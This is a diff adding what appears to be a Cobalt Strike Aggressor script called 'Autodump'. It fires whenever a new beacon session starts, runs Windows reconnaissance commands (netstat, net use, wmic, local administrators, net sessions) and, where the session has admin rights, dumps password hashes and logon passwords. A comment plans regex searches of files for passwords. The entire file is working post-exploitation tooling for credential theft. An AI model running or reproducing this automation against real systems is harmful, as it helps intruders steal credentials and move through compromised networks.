@@ -1,0 +1,51 @@
+
+
+sub generic_info_dump {
+    blog($1, "Listing session information");
+
+    binput($1, "shell netstat -na | findstr \"ESTABLISHED\"");
+    bshell($1, "netstat -na | findstr \"ESTABLISHED\"");
+
+    binput($1, "shell net use");
+    bshell($1, "net use");
+
+    binput($1, "shell wmic os get osarchitecture");
+    bshell($1, "wmic os get osarchitecture");
+
+    binput($1, "shell net localgroup \"Administrators\"");
+    bshell($1, "net localgroup \"Administrators\"");
+
+    binput($1, "net sessions");
+    bnet($1, "sessions", "\\\\localhost","");
+}
+
+sub dump_credentials {
+    
+    binput($1, "hashdump");
+    bhashdump($1);
+
+    binput($1, "logonpasswords");
+    blogonpasswords($1);
+
+    #TODO raid common files with regex to find likely passwords
+
+}
+
+on beacon_initial {
+    # $1 is the beacon id
+
+    blog($1, "Autodump running");
+    bnote($1, "Autodump running");
+
+    generic_info_dump($1);
+
+    # determine if user is local admin
+    if (-isadmin $1) {
+            blog($1, "This session is admin");
+            blog($1, "Dumping creds");
+            dump_credentials($1);
+        }
+
+    bnote($1, "Autodump completed");
+    blog($1, "Autodump completed");
+}
